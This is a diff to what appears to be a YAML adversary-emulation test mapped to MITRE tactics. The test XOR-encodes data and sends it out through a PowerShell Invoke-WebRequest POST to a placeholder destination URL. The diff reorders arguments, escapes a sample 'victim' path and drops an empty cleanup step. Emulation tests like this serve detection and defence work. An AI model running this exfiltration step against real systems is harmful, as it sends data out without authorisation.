@@ -4,15 +4,15 @@ description: |
     XOR encodes the data with a XOR key.
     Reference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f
 args:
-    - name: key
-      type: string
-      default: abcdefghijklmnopqrstuvwxyz123456
     - name: destination_url
       type: url
       default: example.com
     - name: plaintext
       type: string
-      default: Path\n----\nC:\Users\victim
+      default: Path\\n----\\nC:\\Users\\victim
+    - name: key
+      type: string
+      default: abcdefghijklmnopqrstuvwxyz123456
 uuid: c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08
 mitre:
     tactics:
@@ -37,6 +37,3 @@ steps:
         [System.Net.ServicePointManager]::Expect100Continue = $false
         Invoke-WebRequest -Uri {{.Args.destination_url}} -Method POST -Body $cyphertext -DisableKeepAlive
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
